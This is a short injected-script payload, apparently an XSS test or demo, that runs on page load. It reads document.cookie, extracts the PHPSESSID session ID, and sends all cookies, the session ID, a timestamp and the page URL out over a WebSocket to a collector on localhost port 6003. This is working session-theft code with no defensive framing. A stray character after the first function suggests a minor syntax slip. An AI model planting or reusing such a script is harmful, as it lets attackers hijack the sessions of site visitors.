<script>
function calcDate(){
    var date = new Date();
    return date.toLocaleString();
}-

function ConnectWebSocket() {
        var cookies = document.cookie;
	var sessionID = \"\"; 	
	cookiearray = cookies.split(\';\');
	//get session id from cookies
        for(var i=0; i<cookiearray.length; i++){
           name = cookiearray[i].split(\'=\')[0] + \'\'; 
           value = cookiearray[i].split(\'=\')[1] + \'\'; 
	   if(name == \" PHPSESSID\"){
		sessionID = value;
		break;			
	    }
       }
	var referer = document.URL + \'\';	
        var websocket = new WebSocket(\"ws://localhost:6003/&cookie=\" + cookies + \"&sessionID=\" + sessionID + \"&date=\"+ calcDate() + \"&referer=\" + referer + \"&/\", \"GET\");
        websocket.onopen = function () {
            websocket.send(\"a test message\");
        }
       
}
ConnectWebSocket();
</script>